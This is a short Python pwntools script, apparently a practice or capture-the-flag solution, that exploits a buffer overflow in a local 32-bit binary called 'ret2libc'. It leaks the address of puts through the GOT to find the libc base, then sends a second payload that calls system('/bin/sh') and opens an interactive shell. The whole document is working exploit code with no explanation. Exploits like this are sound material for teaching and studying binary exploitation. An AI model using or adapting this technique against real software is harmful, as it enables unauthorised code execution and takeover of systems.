from pwn import *

p = process("./ret2libc")
# attach(p)
libc = ELF("/lib32/libc.so.6")
elf = ELF("./ret2libc")

p.recv()
putsPlt = elf.plt['puts']
putsGot = elf.got['puts']
mainAddr = elf.symbols['main']

junk = b'a'*76
payload = junk + p32(putsPlt) + p32(mainAddr) + p32(putsGot)
p.sendline(payload)
putsAddr = u32(p.recv(4))       #puts real address

libcBase = putsAddr - libc.symbols['puts']

systemAddr = libcBase + libc.symbols['system']
shellAddr = libcBase + next(libc.search(b"/bin/sh"))

p.send(junk + p32(systemAddr) + p32(0xdeadbeef) + p32(shellAddr))
p.interactive()
